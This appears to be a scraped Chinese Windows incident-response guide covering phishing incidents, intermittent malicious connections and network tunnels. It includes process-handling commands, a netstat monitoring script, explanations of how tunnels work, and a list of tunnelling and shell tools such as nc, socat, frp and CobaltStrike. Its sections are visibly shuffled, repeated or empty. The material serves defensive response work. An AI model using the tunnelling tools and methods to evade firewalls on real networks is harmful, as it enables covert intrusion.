### 3) 图形化工具

如果此时正在被暴力破解，应该会出现较多与 `FTP` 服务端口(默认`21`)的连接

### 3) 查看最近登录情况

查看近期登录情况需要查看登录日志

此处可以找到日志的位置

日志格式是文本

我们直接寻找状态码为 `230` 的登录日志即可

这里使用 Windows 中的 `type` 命令 + `findstr` 命令的组合 (也不知道为什么看文件的命令命名为 type)

 `type xxx.log | findstr /C:"#Fields" /C:" 230 "

```

`findstr` 的 `/C` 可以同时筛选多个字符，这样可以把标题带上，大家更容易理解

可以看到前几条都是匿名登录的，因为登录用户名栏显示 `-` ， 后面几条都是 `demo` 这个用户登录的了

FTP 状态码具体信息可以查看 知识点附录 -> 0x04 FTP状态码列表

### 系统快照

这种主要是云环境或虚拟化环境比较方便，目前似乎这类方式取证出来的内容都会丢失内存信息，属于是关机-快照-导出

虚拟机软件似乎支持例如暂停、冻结等功能，具体根据实际情况决定

### 磁盘取证

磁盘取证有很多工具可以考虑

 - `dd`
 - `FTK Imager`

### 针对性取证

这部分推荐我们自己的 NOPTrace-Collector

https://github.com/Just-Hack-For-Fun/NOPTrace-Collector

我们还推出了一套数字取证和应急响应规范，可以根据此规范自己开发取证程序

https://github.com/Just-Hack-For-Fun/OpenForensicRules

### 内存取证

- `DumpIt`
 - `FTK Imager`

 取证后，对证据进行分析时，需要先单独复制一份，保持所有安全人员分析的基础是相同的

## 9. 钓鱼事件

> 原文：https://books.noptrace.com/windows/8.%E9%92%93%E9%B1%BC%E4%BA%8B%E4%BB%B6/

### 0x00 固定证据

在发生任何安全事件时，确定安全事件真实存在以后，第一步都建议固定证据，固定证据一般有以下几种类型，受害单位可以根据实际需求选择

 - 系统快照 - 一般云环境比较方便这么做
 - 磁盘取证
 - 针对性取证 - 例如日志文件、网络信息、数据库等
 - 内存取证

### 0x01 切断传播途径

钓鱼事件不同于其他事件，被钓鱼的目标通常是个人终端，所以可以直接采取断网、关机等快捷处置方法来切断传播途径

如果攻击者使用了远控木马，可以考虑直接在防火墙上双向封禁该IP

### 0x02 确定钓鱼方式

现在钓鱼方式非常多样化，如下：

 - 钓鱼邮件
 - 钓鱼短信
 - 钓鱼电话
 - 钓鱼二维码
 - 钓鱼网站
 - 社交媒体钓鱼附件
 - 网络劫持钓鱼
 - USB 等设备钓鱼
 - 物理接触钓鱼
 - ...

 切断传播途径后，应该第一时间了解本次钓鱼的方式，这有利于掌握攻击者信息，根据攻击者投入情况，推测事件性质，而且可以快速做同类型的钓鱼受害面梳理

### 0x03 梳理受害范围

梳理受害范围主要是两个方向

 - 哪些员工受到了本次钓鱼攻击的威胁，真正受害的有哪些？
 - 已经明确受害的主机具体造成了哪些危害？ 以及它能导致的危害
 - 权限被控？
 - 账号密码泄漏？
 - 横向攻击？
 - 敏感文件泄漏？

### 0x04 隔离或排查受害主机

经过上一步，我们已经对本次事件有了明确的认识，接下来就是处置，对于个人终端，直接断网处置即可，对于被控服务器，可以考虑从网络层面进行隔离，只允许必要的业务访问（其实即使没有被攻击，默认也应该这样配置）

排查过程主要是结合受害主机上存在的痕迹以及内部安全设备能够提供的网络、应用、系统等日志来确定到底攻击者做了哪些攻击，是否已经获取控制权等，进而展开针对性排查

具体可以参照远控后门章节部分

### 0x05 分析被钓鱼原因

排查处理完毕后，就是分析被钓鱼原因的部分了，这部分很重要，了解防御体系的薄弱点，一块一块地修补上是安全建设的常态

分析被钓鱼的原因的过程中，切记不要出现 “厌蠢” 的想法，每一个骗局都可能是从不起眼的角落开始的，在分析原因的过程中可以以被钓鱼人员的视角展开，常见的原因如下：

 - 纯粹安全意识薄弱，甚至没有安全意识
 - 第一次被钓鱼，盲目认为自己不会成为攻击对象
 - 手滑，没多想就点击了恶意程序
 - 攻击者冒用了受信任的身份，很多攻击者喜欢攻击学校邮箱，之后冒用身份给HR等发钓鱼邮件
 - 攻击者通过正常业务取得受害者信任，这种多见于需要对外的部门，交流多次后取得信任
 - 攻击者制造偶然事件，获得受害者信息，例如微博、脉脉等平台添加还有，不断深入交流，直到取得信任
 - 攻击者通过心理干预，影响受害者判断，常见于恐吓、求助、示弱等心理
 - 攻击者从内部发起钓鱼，假设控制了前台电脑，之后向公司群里发钓鱼附件等
 - 攻击者手法高明，采用了 0day、免杀、多重加载等方式钓鱼
 - ...

 被钓鱼的原因背后往往还有深层次的原因，安全意识薄弱、主机安全做得不到位、公私电脑混用、网络区域划分不清、责任意识不强等

### 0x06 加固防御体系

根据之前分析的结果，结合现有防御体系，进行专项加强，例如

 - 将本次事件作为典型通报全公司
 - 组织安全意识培训
 - 加强个人电脑以及邮件网关等设备的安全管理
 - 建立钓鱼信息发现、上报、研判、反馈机制
 - 合理进行网络区域规划
 - 开展全面的钓鱼演练

### 0x07 善后阶段

直接查看善后阶段即可，主要为定损以及针对性排查处理，目的是解决潜在的受害服务器

### 0x08 常规安全检查阶段

直接根据常规安全检查章节进行安全检查即可，目的是找出当前系统中存在的隐藏后门等

### 系统快照

这种主要是云环境或虚拟化环境比较方便，目前似乎这类方式取证出来的内容都会丢失内存信息，属于是关机-快照-导出

虚拟机软件似乎支持例如暂停、冻结等功能，具体根据实际情况决定

### 磁盘取证

磁盘取证有很多工具可以考虑

 - `dd`
 - `FTK Imager`

### 针对性取证

这部分推荐我们自己的 NOPTrace-Collector

https://github.com/Just-Hack-For-Fun/NOPTrace-Collector

我们还推出了一套数字取证和应急响应规范，可以根据此规范自己开发取证程序

https://github.com/Just-Hack-For-Fun/OpenForensicRules

### 内存取证

- `DumpIt`
 - `FTK Imager`

 取证后，对证据进行分析时，需要先单独复制一份，保持所有安全人员分析的基础是相同的

## 10. 非持续性事件

> 原文：https://books.noptrace.com/windows/9.%E9%9D%9E%E6%8C%81%E7%BB%AD%E6%80%A7%E4%BA%8B%E4%BB%B6/

### 0x00 简介

持续性的挖矿、远控后门等可以通过直接排查发现，但是在实际工作中，很多恶意行为（访问恶意域名、连接恶意IP）只集中出现了几次，无法直接通过网络连接找到恶意进程及文件或者有些恶意程序处置结束后，无法确定是否已经清理完整

可以通过一段网络监控来解决

### 0x01 固定证据

在发生任何安全事件时，确定安全事件真实存在以后，第一步都建议固定证据，固定证据一般有以下几种类型，受害单位可以根据实际需求选择

 - 系统快照 - 一般云环境比较方便这么做
 - 磁盘取证
 - 针对性取证 - 例如日志文件、网络信息、数据库等
 - 内存取证

### 0x02 确定目标域名或IP

如果目标域名或者IP是某一知名组织的，可以将该组织或者种类病毒的域名和IP都收集进行监控

收集到域名或IP后可以先考虑使用内存搜索工具进行搜索试试，说不定有惊喜

具体查看 小技巧 -> 0x03 内存中搜索字符串

### 0x03 修改域名解析记录

修改恶意域名的解析记录目的主要有两个：

 - 阻断控制，防止二次伤害
 - 得到固定的IP解析记录，防止攻击者把域名下架或者改变解析到的IP

 修改域名解析记录有两个途径：

 - 在内网DNS服务器中集中修改（如果内网有DNS服务器）
 - 修改 hosts 文件 (推荐)

 以恶意域名 `du.testjj.com` 为例

通过修改 `C:\Windows\System32\drivers\etc\hosts` 将 `du.testjj.com` 解析IP修改为 `123.123.123.123`

直接修改 `hosts` 无法保存，可以先保存到桌面，之后拖进去覆盖原来的 `hosts` 文件

### 0x04 设置监控程序

很多客户不允许在服务器上安装监控程序(例如 sysmon)，但是对于可审计的脚本倒是可以在审计后执行，因此这里主要以脚本为主

`Windows_Audit_Nop.bat`

 `@echo off

:loop
if exist "%USERPROFILE%/Desktop/bat_result.txt" (
    echo "find it!!!"
    timeout /T 5 /NOBREAK
    goto loop
) else (
for /f "tokens=5" %%a in ('netstat /ano ^| findstr 123.123.123.123') do (
wmic process where processid=%%a get name,executablepath,processid,CommandLine >> %USERPROFILE%/Desktop/bat_result.txt
)

timeout /T 1 /NOBREAK
)

goto loop

```
 如果可以安装监控程序，那还是更推荐 `sysmon`

https://learn.microsoft.com/zh-cn/sysinternals/downloads/sysmon

### 0x05 等待恶意程序执行

通过浏览器访问恶意域名 `du.testjj.com`，模拟恶意程序

监控程序成功捕获到恶意连接

在桌面生成了结果文件

 `CommandLine   ExecutablePath Name ProcessId
"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=zh-CN --service-sandbox-type=none --mojo-platform-channel-handle=1812 --field-trial-handle=1768,i,7652988387197081015,10381105602455089138,262144 --variations-seed-version /prefetch:3  C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe  msedge.exe  3464

```
 捕获到了恶意文件位置、启动参数、`pid` 等信息

### 0x06 确定进程启动时间

这一步骤的主要意义在于对比进程启动时间与恶意文件的相关时间，确定在进程启动后，该文件是否修改过。

根据上述信息简单判断一下启动该异常进程的文件是否为我们找到的文件

### 0x07 处理异常进程

### 0x08 删除恶意文件

### 0x09 善后阶段

直接查看善后阶段即可，主要为定损以及针对性排查处理，目的是解决潜在的受害服务器

### 0x10 常规安全检查阶段

直接根据常规安全检查章节进行安全检查即可，目的是找出当前系统中存在的隐藏后门等

### 1. 恶意文件样本采样

在 Windows 上这个就简单多了，可以直接通过网络或者 `U` 盘等介质进行取样

### 1. Powershell

`# 代码版
$maliciousPid = <恶意进程的PID>
$process = Get-Process -Id $maliciousPid
$startTime = $process.StartTime
Write-Host "进程启动时间：" -NoNewline
Write-Host $startTime

```
 `# 压缩成一条命令
$maliciousPid=<恶意进程的PID>; $startTime=(Get-Process -Id $maliciousPid).StartTime; Write-Host "进程启动时间：" -NoNewline; Write-Host $startTime

```

### 1) 暂停进程

【资源监视器】

进程暂停后，`ping` 的动作随即暂停

进程处于暂停状态时，可以恢复进程执行，也可以直接结束掉进程或进程树，我们尝试恢复

被暂停掉的进程继续执行，暂停和恢复前 `pid` 不会发生变化

通过暂停以及恢复，我们基本可以确定要被处理的进程是否为该进程，当然，如果有必要的话才这么做

【`PsSuspend`】

https://learn.microsoft.com/zh-cn/sysinternals/downloads/pssuspend

https://download.sysinternals.com/files/PSTools.zip

暂停进程

 `pssuspend.exe <进程id>

```

恢复进程

 `pssuspend.exe -r <进程id>

```

其他图形化工具基本上都是右键，点击选择就可以了

### 1. 确定文件占用情况

图形化工具中可以直接通过搜索框进行搜索关键字

更好方式是通过搜索文件句柄

`handle` 程序

https://download.sysinternals.com/files/SysinternalsSuite.zip

这是Sysinternals Suite中的一个方便的命令行实用程序，可显示哪些文件由哪些进程打开等

可以通过下面的链接单独下载 handle

https://download.sysinternals.com/files/Handle.zip

若发现存在其他进程占用恶意文件，可能也是恶意进程，可以考虑按照之前的方法处理

### 2. 威胁分析

既然有了恶意样本，可以通过人工或在线平台进行分析

 - 微步云沙箱
 - Virustotal
 - virscan
 - 哈勃
 - jotti
 - scanvir
 - 魔盾
 - HYBRID
 - 奇安信情报沙箱
 - 大圣云沙箱检测系统
 - YOMI
 - 360沙箱云
 - 安恒云沙箱

### 2. wmic

`wmic process where ProcessId=<进程PID> get ProcessId, CreationDate

```
 `wmic` 的显示格式不是很友好，但是依旧可读，而且更详细

### 2) 杀死进程

【`taskkill`】

 `taskkill /F /PID <进程ID>

```

【`Powershell`】

 `Stop-Process -Id <进程ID> -Force

```

【`wmic`】

 `wmic process where ProcessId=<进程ID> call Terminate

```

【`pskill`】

https://download.sysinternals.com/files/PSTools.zip

 `pskill64.exe <进程ID>

```

【资源监视器】

其他图形化工具也是类似的使用方法

### 2. 查询注册表

部分恶意程序可能对注册表进行了修改，内容包含恶意程序的名字，这里需要在注册表中搜索一下

`Win + r` 打开运行框，输入 `regedit`，回车

这样就可以进行全局搜索了

即使搜索到了，也不要着急删除或修改，跟各方确定好，这很重要

### 3. 寻找病毒分析报告

- 深信服EDR团队安全情报分析
 - 火绒安全最新资讯
 - 安全客
 - Freebuf
 - 微步在线 X 情报社区
 - 安天
 - ...

### 3. Process Explorer

当然还是可以通过右键属性的方式查看

### 3) 杀死进程树

如果恶意进程所在的整个进程树都是恶意的，那就需要杀死整个进程树，在某个进程上杀死进程树就是杀死由该进程起的所有子孙进程

杀死进程已经是危险操作了，杀死进程树更要谨慎

查看进程树

这件事自带的工具并不直观，需要借助第三方工具

【`Process Explorer`】

可以看到， `PING.EXE` 进程的父进程为 `cmd.exe` `pid`为 `3252` , 再上一层父进程为 `explorer.exe` `pid`为 `3140`

如果此时在 `PING.EXE` 上右键，杀死进程和杀死进程树是没有大区别的，因为 `PING.EXE` 并没有子进程，但是如果在上一层 `cmd.exe` 上杀死进程树，那么 `cmd.exe (pid: 3252)` 以及其子进程 `conhost.exe` 和 `PING.exe` 也会被杀死

尝试在 `PING.EXE` 右键杀死进程树

可以看到，其实只有 `PING.EXE (pid: 6656)` 自己被杀死了

我们再启动 `PING.EXE` ，尝试在 `conhost.exe (pid: 5240)` 进程右键杀死进程树

虽然 `cmd` 的黑框框消失了，但是 `PING.EXE` 还在继续运行,如果仅在 `cmd.exe (pid: 5272)` 上右键，仅杀死进程

`PING.EXE` 进程还是会继续运行下去

接下来尝试"赶尽杀绝"

尝试重新起一个 `cmd` 并且执行 `PING.EXE` ，在 `cmd` 进程上右键杀死进程组

这回由该`cmd.exe (pid: 5500)` 其的进程以及子进程都被杀死了

【`Process Hacker`】

`Process Hacker` 以进程树形式显示的话，没有找到相关选项，可能默认就是吧，如果你的不是，可以通过以下方法实现

点击 `Name` 标题栏三次，其实就是我们之前排序，第三次正好是取消排序，之后就会以进程树的形式显示

剩下的使用方法和 `Process Explorer` 一样了

【`System Informer`】

基本与 `Process Hacker` 一样

这里需要提一点，可以看到，在 `PING.EXE` 上右键时，结束进程树的按钮是灰色的，这些小细节应该就是 `System Informer` 与 `Process Hacker` 相比进步的地方吧，所以现在比较建议用新工具，当然前提是你测试过没有蓝屏这种严重 `bug`

### 3. 删除恶意文件

直接图形化删除或者通过下面的命令

 `# cmd
del xxx

```
 `# Powershell
Remove-Item -Path xxx

```

### 4. 进程查杀

我们不仅可以杀死进程及进程树，还可以让进程暂停(`suspend`)或者进程重启

进程查杀是一个危险操作，所以可以考虑先暂停，看看是否符合预期，再决定是否杀死进程

需要注意的是，即使暂停了进程，该进程的网络连接不见得会断，一般情况下无法发送和接收数据

### 4. Process Hacker

### 4) 杀死线程

这是一个更加危险的操作，可能对操作系统的稳定性产生影响，尤其是在你手抖的时候

【`System Informer`】

通过右键 -> 属性(`Properties`) -> `Threads` 就可以看到该进程具体的线程信息了

在线程上右键就可以选择 `Terminate` 来杀死线程

可以看到，杀死 `PING.exe` 进程中的一个线程后， 原本的 `ping` 命令卡死了，不再输出 `ping` 命令的信息，但是并没有退出（结束进程），进程依旧活着，而且剩余两个线程也没有退出

过了几秒

整个进程死掉了

`Process Explorer`会提示下载一个其他程序，但是不下载也能显示，`System informer` 没有这个提示

### 5. System Informer

### 6. 获取异常文件的时间信息

文件浏览器

`Process Explorer`

### 系统快照

这种主要是云环境或虚拟化环境比较方便，目前似乎这类方式取证出来的内容都会丢失内存信息，属于是关机-快照-导出

虚拟机软件似乎支持例如暂停、冻结等功能，具体根据实际情况决定

### 磁盘取证

磁盘取证有很多工具可以考虑

 - `dd`
 - `FTK Imager`

### 针对性取证

这部分推荐我们自己的 NOPTrace-Collector

https://github.com/Just-Hack-For-Fun/NOPTrace-Collector

我们还推出了一套数字取证和应急响应规范，可以根据此规范自己开发取证程序

https://github.com/Just-Hack-For-Fun/OpenForensicRules

### 内存取证

- `DumpIt`
 - `FTK Imager`

 取证后，对证据进行分析时，需要先单独复制一份，保持所有安全人员分析的基础是相同的

## 11. 隧道事件

> 原文：https://books.noptrace.com/windows/10.%E9%9A%A7%E9%81%93%E4%BA%8B%E4%BB%B6/

### 0x00 简介

隧道事件的事件来源一般有以下几种：

 - 流量设备发现存在网络隧道
 - 主机安全程序发现存在网络隧道或相关文件、进程
 - 排查过程中发现存在跳板机痕迹等，进而发现隧道
 - 运维相关人员发现异常端口等

 其实大家可以发现，处理隧道与处理远控后门没有太大的区别，因为隧道本身就是后门大概念中的一部分，所以也是通过各种特征找到 `PID` ，进而处理

大多数协议隧道都包含两点特征：

 - 存在短时间、单一目标、频繁请求的该协议的数据包
 - 可能出现额外本地到本地的连接 (127.0.0.1:xx -> 127.0.0.1:xx)

 大家需要明白一点，发现隧道并不是应急人员要做的，验证处理才是，现在隧道程序五花八门，尝试去记住特征并识别意义并不大，下面的部分也仅仅是介绍一些隧道技术与正常网络连接的差异，如果隧道程序想做，完全可以做到和正常网络连接没区别

这里给大家推荐一篇总结内网代理工具与检测方法研究的文章，下面部分内容参考该文章

https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==&mid=2247483876&idx=1&sn=b71f016be9f345699efcbffdc27b626f&chksm=c2a1d56df5d65c7bbee6e1052d0405eab5cb6dbb98bd549459b83b5a2ab6b530cd078ca5398e&token=229680544&lang=zh_CN#rd

### 0x01 固定证据

在发生任何安全事件时，确定安全事件真实存在以后，第一步都建议固定证据，固定证据一般有以下几种类型，受害单位可以根据实际需求选择

 - 系统快照 - 一般云环境比较方便这么做
 - 磁盘取证
 - 针对性取证 - 例如日志文件、网络信息、数据库等
 - 内存取证

### 0x02 DNS 隧道

### 0x03 ICMP 隧道

### 0x04 TCP 隧道

这里不再单独设置SSL/TLS 隧道，都放在 `TCP` 隧道里

### 0x05 UDP 隧道

以前大家对 `UDP` 的评价是快但不稳，但是现在 `HTTP/3` 都是使用基于 `UDP` 的协议的 `QUIC` 协议来完成了，所以基于 `UDP` 协议的隧道也可能会越来越成熟，当然这可能需要开发者自己进行一些实现

### 0x06 KCP 隧道

`KCP` 协议就是一种基于 `UDP` 协议的可靠实现，部分游戏采用 `KCP` 来提高流畅性，做网络加速

### 0x07 QUIC 隧道

### 0x08 Web 隧道

这里 Web 隧道是指基于网页脚本的隧道以及通过web相关协议搭建隧道，至于端口复用、篡改web服务器那种不在此范围内

### 0x09 隧道处置流程

上面的内容介绍了隧道的特征、工具等，处理隧道最难的部分就是找到隧道的进程，尤其是 ICMP/DNS 这类隧道，我们既然来处理隧道，至少我们应该知道的是隧道对端的IP地址

所以接下来的处置就是根据IP地址，找出与该IP地址通信的进程，推荐两种方法：

 - Microsoft Message Analyzer
 - Netsh + Wireshark

 详细实验可以参照我们公众号的文章

https://mp.weixin.qq.com/s/iDT1NfkLHjkkpywGx_QiXQ

### 1. 原理

DNS隧道是一种利用域名系统（DNS）协议来传输数据的技术。它的原理是通过将数据编码为DNS查询或响应的有效载荷来传输数据，从而绕过了网络防火墙和安全设备对传统数据流量的检测和限制。

DNS隧道的工作原理如下：

 - 数据编码：要传输的数据被编码为DNS查询或响应的有效载荷。通常，数据会被分割成较小的块，并将其编码为域名或其他DNS字段的一部分。编码方法可以是基于文本的编码（如Base64）或其他自定义编码方案。

 - DNS查询/响应：编码后的数据被放置在DNS查询或响应中的有效载荷部分。对于查询类型的DNS隧道，客户端发送DNS查询请求到DNS服务器，有效载荷中包含了编码后的数据。对于响应类型的DNS隧道，DNS服务器将数据编码后包含在DNS响应中返回给客户端。

 - DNS解析与提取：接收方接收到DNS查询或响应后，会解析其中的有效载荷，并提取出编码的数据。解析和提取过程通常是通过特定的DNS隧道工具或脚本来完成的。

 - 数据重组和处理：接收方将提取到的数据进行解码和重组，以还原原始数据。这些数据可以是任何类型的，例如文件、命令、消息等。接收方根据应用程序的需要对数据进行处理。

### 1. MMA

MMA 是微软官方开发的，已经停止开发了，但依旧可以使用

点击开始本地追踪

输入过滤条件后，可以直接筛选出相关的流量，现在我们看看能不能找到进程id

默认好像看不出什么，就是分析了 ICMP 数据包，我们点击上方的 Tools 调出其他 details 界面

成功找到进程id以及对应的启动命令

### 1. 原理

ICMP隧道（ICMP Tunneling）是一种将其他协议的数据封装在ICMP报文中进行传输的技术。它通过利用ICMP协议的特性，将非ICMP流量伪装成ICMP报文，以达到绕过防火墙或过滤器的目的。

ICMP是Internet控制消息协议，通常用于网络设备之间传递控制、错误和诊断信息。ICMP报文通常包含有关网络连接性和状态的信息，例如ping命令所使用的回显请求和回显应答消息。

ICMP隧道的技术原理如下：

 - 封装：在发送端，非ICMP流量（例如TCP、UDP或其他协议的数据包）被封装在ICMP报文的数据字段中。ICMP报文的类型和代码字段通常被设置为合法的值，以使其看起来像是合法的ICMP消息。

 - 传输：经过封装后的ICMP报文被发送到目标主机。由于ICMP通常允许通过防火墙或过滤器，因此可以使用ICMP隧道绕过这些网络安全设备。

 - 解封装：在接收端，目标主机接收到ICMP报文，然后解析出封装的非ICMP流量。解封装后的数据被递交给相应的协议栈进行处理，如TCP或UDP。

### 1. 原理

TCP隧道是一种将TCP流量封装在另一个协议的数据包中进行传输的技术。它的原理可以简单概括为以下几个步骤：

 - 建立隧道端点：在隧道的源端和目的端分别建立隧道的端点。源端是发送方，目的端是接收方。

 - 封装数据包：在源端，将要通过隧道传输的TCP数据包封装在另一个协议的数据包中。封装后的数据包中，原始的TCP数据包成为内部数据，称为"payload"。

 - 发送数据包：封装后的数据包通过底层网络传输到目的端。通常，封装后的数据包会经过一系列的路由器、交换机等网络设备。

 - 解封数据包：在目的端，接收到封装后的数据包后，进行解封操作。将内部的TCP数据包提取出来，恢复原始的数据。

 - 传递数据：解封后的TCP数据包可以被目的端的应用程序处理，正常地进行TCP通信。

 通过这种方式，TCP隧道可以在不同网络环境中传输TCP流量，绕过网络限制、防火墙或过滤器等。它可以用于建立安全连接（如VPN隧道），进行远程访问，或在特殊需求下隐藏真实的TCP流量。

需要注意的是，TCP隧道的实现可能涉及加密、认证和数据完整性等安全机制，以确保隧道中的数据传输的安全性和可靠性

### 1. 原理

UDP（User Datagram Protocol）隧道是一种将其他协议的数据包通过UDP封装并在UDP数据报中进行传输的技术。UDP隧道的原理可以简要概括如下：

 - 封装：在发送端，原始数据包（例如TCP数据包、IP数据包等）被封装在UDP数据报中。UDP数据报的格式通常包括源IP地址、目标IP地址、源端口号、目标端口号以及封装的原始数据。

 - 传输：封装后的UDP数据报通过网络传输。由于UDP是一种无连接的协议，它不会像TCP那样保证可靠的数据传输。UDP隧道可能会面临丢包、乱序等传输问题。

 - 解封装：在接收端，UDP数据报被接收并解封装，以还原原始数据包。解封装后的数据可以被传递给相应的协议栈进行处理。

 UDP隧道的使用场景包括以下几个方面：

 - 穿越防火墙和NAT：由于UDP协议相对于TCP协议更容易穿越防火墙和NAT设备，UDP隧道可以用于在防火墙或NAT之间建立通信通道，以便绕过网络限制。
 - 加密和隐匿通信：通过在UDP数据报中封装其他协议的数据，可以实现对通信内容的加密和隐匿，从而提供一定程度的安全性和隐私保护。
 - 绕过流量限制：某些网络环境可能对特定协议或端口的流量进行限制，通过将流量封装在UDP数据报中，可以绕过这种限制。
 - VoIP和实时流媒体：UDP隧道在VoIP和实时流媒体应用中常用，因为UDP协议适合传输对实时性要求较高的数据，如音频和视频。

### 1. 原理

KCP（KCP Protocol）隧道的原理基于KCP协议本身，它使用UDP作为传输层协议，并通过KCP协议进行数据的封装和传输。以下是KCP隧道的基本原理：

 - KCP协议封装: KCP隧道首先将要传输的数据进行封装。KCP协议对数据进行分段，并为每个数据段添加序列号、时间戳等信息。这些信息用于保证数据传输的可靠性和顺序性。
 - UDP传输: 封装后的数据通过UDP协议进行传输。UDP是一种无连接的传输协议，它提供了较低的传输延迟和更好的性能，适用于实时通信和快速数据传输。
 - 接收端解封装: 接收端收到UDP数据包后，进行KCP协议的解封装。它解析数据段的序列号和时间戳信息，并根据KCP协议的机制进行数据包的排序、丢包检测和重传处理。
 - 重传和拥塞控制: 如果接收端检测到数据包丢失或乱序，KCP协议会触发重传机制，发送端会重新发送丢失的数据包。同时，KCP还实现了拥塞控制机制，根据网络状况动态调整发送窗口和拥塞窗口大小，以避免过度拥塞。
 - 应用层处理: 解封装后的数据交给上层应用进行处理。这可能涉及数据的解密、解压缩以及应用特定的处理逻辑。

 通过KCP隧道，可以在不可靠的UDP传输上实现可靠的数据传输，提供较低的延迟和较高的吞吐量。KCP隧道通常用于加密、加速和稳定UDP流量的传输，适用于游戏、实时流媒体、远程访问等各种应用场景。

### 1. 原理

QUIC（Quick UDP Internet Connections）隧道是一种基于UDP的传输协议，用于提供安全、可靠和高效的通信。QUIC隧道的原理如下：

 - 建立连接: QUIC隧道的建立是通过客户端和服务器之间的握手过程完成的。客户端和服务器之间首先通过UDP通信建立初始连接。在初始连接中，双方交换握手数据包，包括加密信息、协议版本、连接参数等。
 - 加密和鉴权: QUIC隧道使用TLS（Transport Layer Security）进行加密和鉴权。在握手过程中，客户端和服务器会协商密钥和加密算法，并进行身份验证。这确保了通信的机密性和完整性。
 - 多路复用: QUIC隧道支持多路复用，即在同一个UDP连接上可以同时传输多个数据流。这意味着多个应用程序或服务可以共享同一个QUIC连接，提高了网络利用率和性能。
 - 拥塞控制: QUIC隧道内置了拥塞控制机制，用于监测网络的拥塞程度，并相应地调整数据传输的速率。通过动态调整发送速率和接收确认，QUIC可以在网络拥塞情况下保持良好的性能。
 - 快速重传和重传控制: QUIC隧道具有快速重传和重传控制机制，用于处理丢包和数据传输错误。当发生丢包时，QUIC会快速重传丢失的数据包，而无需等待超时。此外，QUIC还使用前向纠错和ECN（Explicit Congestion Notification）等技术来提高数据传输的可靠性。
 - 流量控制: QUIC隧道支持流量控制，以确保发送方和接收方之间的数据传输平衡。通过动态调整数据发送速率和接收窗口大小，QUIC可以避免发送方过载和接收方溢出。

 总体而言，QUIC隧道通过使用UDP协议和内置的机制，如加密、多路复用、拥塞控制和快速重传等，提供了快速、高效、安全和可靠的通信。它在网络环境不稳定或存在阻塞的情况下表现出色，并被广泛用于提供实时通信、流媒体传输和移动应用等场景。

### 1. 原理

Web隧道是一种通过HTTP或HTTPS协议在网络上建立起隧道连接的技术，允许通过隧道将其他协议的流量（如TCP、UDP等）封装在HTTP或HTTPS请求中进行传输。Web隧道的原理如下：

 - 建立HTTP/HTTPS连接: Web隧道的第一步是建立HTTP或HTTPS连接。客户端通过发送HTTP请求或HTTPS握手请求与服务器建立起连接。这个连接通常是基于标准的HTTP或HTTPS协议，使用TCP作为传输协议。
 - 封装其他协议的流量: 一旦HTTP/HTTPS连接建立成功，客户端可以将其他协议的数据封装在HTTP请求的正文（body）中。可以使用不同的封装方式，如将原始数据直接作为HTTP请求的内容传输，或者将数据进行分割和编码后再传输。
 - 请求转发和响应解析: 客户端将封装好的数据发送给服务器，服务器接收到请求后解析HTTP请求，提取出封装的数据。服务器可以根据数据的类型和目标协议进行相应的处理，例如将TCP数据转发给指定的TCP服务器。
 - 数据传输和转发: 服务器收到封装的数据后，根据目标协议进行相应的数据传输。对于TCP数据，服务器可以将数据转发给指定的TCP服务器；对于UDP数据，服务器可以将数据封装成UDP包并发送给指定的UDP服务器。这样，通过HTTP/HTTPS请求和响应，客户端和服务器之间可以进行数据传输。
 - 响应返回和解封装: 服务器收到目标协议的响应后，将响应数据封装在HTTP响应的正文中，并将响应发送给客户端。客户端收到响应后，解析HTTP响应，提取出封装的数据，并根据需要进行解封装，恢复为原始的协议数据。

 总体而言，Web隧道利用HTTP或HTTPS协议作为载体，在网络上建立起隧道连接，将其他协议的流量封装在HTTP请求和响应中进行传输。这种技术可以绕过网络防火墙或代理的限制，提供一种灵活的方式来传输不同协议的数据。但是请注意，Web隧道可能会面临一些安全和性能方面的考虑，因此在使用时需要进行适当的配置和评估。

### 2. 常见工具

常见的 DNS 隧道工具

 - dnscat2 已经至少两年没有更新
 - dnscat2 (Powershell 版)  目前已经归档
 - iodine
 - DNS_Tunneling
 - CobaltStrike
 - Metasploit-Framework

 DNS 隧道工具演示可以参考知识点附录 -> 0x06 CobaltStrike DNS 隧道演示

### 2. Netsh

Netsh（Network Shell）是Windows操作系统中一个强大的命令行工具，主要用于配置和管理网络设置。这个工具允许用户通过命令行界面或脚本文件来查看、修改和故障排查各种网络相关的配置

启动网络追踪功能(以管理员权限运行)

 `netsh trace start persistent=yes capture=yes tracefile=.\icmp_capture.etl

```

此时开启抓包，配合流量设备，我们觉得抓到了相关数据包后，停止抓包

 `netsh trace stop

```

我们需要将 `.etl` 格式的包转化为 `Wireshark` 能够解析的包，这需要 `etl2pcapng.exe`

https://github.com/microsoft/etl2pcapng

命令非常简单

 `etl2pcapng.exe in.etl out.pcapng

```

将上述文件拿回本地，使用 Wireshark 打开

此时通过过滤可以看到这些通信流量，包的最上面有一个 `Packet comments` ，我们点击看一下内容是什么

这里面备注了发送给请求数据包的 pid 以及 tid，这样我们就找到了恶意进程

### 2. 常见工具

- Pingtunnel

### 2. 常见工具

- stunnel

 - gtunnel

 - nc

 - ncat

 - socat (官网不知为何清空了内容)

 - frp

 - earthworm  在很早以前就已经清空了项目，但是现在使用的还是不少

 - iox

 - Venom

 - Stowaway

 - nps

 - shadowsocks

 - Project X

 - AnyDesk

 - trojan

 - Udp2raw 这个工具是将UDP伪装成 `TCP/ICMP` ，这里也算是一种`TCP`隧道吧，用来绕过禁止UDP协议的防火墙

 TCP 隧道的工具太多了，基于原版魔改的也多

### 2. 常见工具

- ncat
 - socat (官网不知为何清空了内容)
 - iodine 之前介绍的 `DNS` 隧道的工具
 - OpenVPN
 - WireGuard
 - FOU 隧道，需要一定的动手能力

### 2. 常见工具

- kcptun
 - Dog Tunnel
 - V2ray
 - frp

 更多 `KCP` 实现大家可以参考以下文档

https://github.com/skywind3000/kcp

### 2. 常用工具

- quic-tun
 - gost 这工具支持非常多的协议，多到令人发指
 - http/3

### 2. 常见工具

- reGeorg

 - Neo-reGeorg

### 3. 常见特征

- 可能会在受害端创建一块新的网卡
 - DNS 流量会有明显增加
 - 请求域名较为单一
 - 请求频繁

 - 可能会出现不常用的解析记录的DNS数据包

 - `TXT` 记录
 - `AAAA` 记录

 - 可能会出现长度较长的请求

 - 可能出现内容明显加密的请求

 更多特征可以学习以下文章

https://zhuanlan.zhihu.com/p/143220945

### 3. 常见特征

